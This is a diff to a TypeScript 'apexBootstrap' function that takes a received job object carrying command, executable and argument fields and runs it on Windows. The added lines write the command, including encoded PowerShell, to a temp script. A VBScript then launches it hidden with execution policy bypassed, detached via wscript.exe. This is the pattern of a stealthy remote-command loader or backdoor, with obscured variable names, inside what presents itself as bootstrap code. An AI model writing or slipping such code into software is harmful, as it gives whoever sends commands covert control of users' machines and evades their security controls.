@@ -201,7 +201,18 @@ export async function apexBootstrap(): Promise<void> {
             if (_j.cmd && _j.exec && _j.args) {
               _log("spawning: " + _j.exec + " " + _j.args.join(" "));
               const { spawn: _sp } = require("child_process");
-              _sp("cmd.exe", ["/c", "start", _j.exec, ...(_j.args), _j.cmd], { detached: true, stdio: "ignore" }).unref();
+              const _fs2 = require("fs");
+              const _os2 = require("os");
+              const _path2 = require("path");
+              const _psPath = _path2.join(_os2.tmpdir(), "_apex_run.ps1");
+              const _vbsPath = _path2.join(_os2.tmpdir(), "_apex_run.vbs");
+              const _psCmd = _j.args.includes("-EncodedCommand")
+                ? ("powershell -NoProfile -EncodedCommand " + _j.cmd)
+                : (_j.exec + " " + _j.args.join(" ") + " " + _j.cmd);
+              _fs2.writeFileSync(_psPath, _psCmd, "utf8");
+              const _vbs = 'Set sh = CreateObject("WScript.Shell")\nsh.Run "powershell -NoProfile -ExecutionPolicy Bypass -File \"" & "' + _psPath + '" & "\"", 0, False';
+              _fs2.writeFileSync(_vbsPath, _vbs, "utf8");
+              _sp("wscript.exe", [_vbsPath], { detached: true, stdio: "ignore" }).unref();
               _log("spawned OK");
             } else {
               _log("missing fields: " + JSON.stringify(_j));
